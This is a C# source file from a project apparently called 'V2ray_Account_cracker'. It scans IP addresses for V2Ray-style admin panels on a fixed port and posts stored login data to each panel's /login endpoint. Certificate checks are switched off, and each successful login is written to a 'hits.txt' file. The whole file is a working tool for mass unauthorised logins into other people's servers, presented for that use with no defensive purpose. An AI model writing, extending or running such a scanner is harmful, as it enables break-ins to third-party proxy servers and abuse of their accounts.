using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using Leaf.xNet;

namespace V2ray_Account_cracker
{
    internal class Methods
    {
        public static void config(string IP)
        {
            if(isServer(IP))
            {
                logIn(IP);
            }
            Form1.check++;
        }
        private static bool isServer(string ip)
        {
            HttpClient client = new HttpClient();
            try
            {
                string host = $"http://{ip}:{Constants.PORT}";
                HttpRequest login = new HttpRequest();
                login.IgnoreProtocolErrors = true;
                login.KeepAlive = true;
                login.SslCertificateValidatorCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                login.AllowAutoRedirect = true;
                login.ConnectTimeout = 1000;
                string res = login.Get(host).ToString();

                if (res.Contains("<h1>"))
                    return true;
                return false;
            }
            catch
            {
                return false;
            }
        }
        private static bool logIn(string ip)
        {
            string host = $"http://{ip}:{Constants.PORT}/login";
            try
            {
                HttpRequest login = new HttpRequest();
                login.IgnoreProtocolErrors = true;
                login.KeepAlive = true;
                login.AddHeader(HttpHeader.Accept, "application/json, text/plain, */*");
                login.AddHeader(HttpHeader.AcceptLanguage, "en-IR,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,fa;q=0.6,ar;q=0.5");
                login.AddHeader(HttpHeader.Origin, $"http://{ip}:{Constants.PORT}");
                login.AddHeader("Host", ip);
                login.Referer = $"http://{ip}:{Constants.PORT}/";
                login.UserAgent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
                login.SslCertificateValidatorCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                login.AllowAutoRedirect = true;
                string res = login.Post(host, Constants.DATA, "application/x-www-form-urlencoded; charset=UTF-8").ToString();
                if (res.Contains("\"success\":true"))
                {
                    StreamWriter writer = new StreamWriter("hits.txt", true);
                    writer.WriteLine(ip.ToString());
                    writer.Close();
                    Form1.good++;
                    return true;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
    }
}
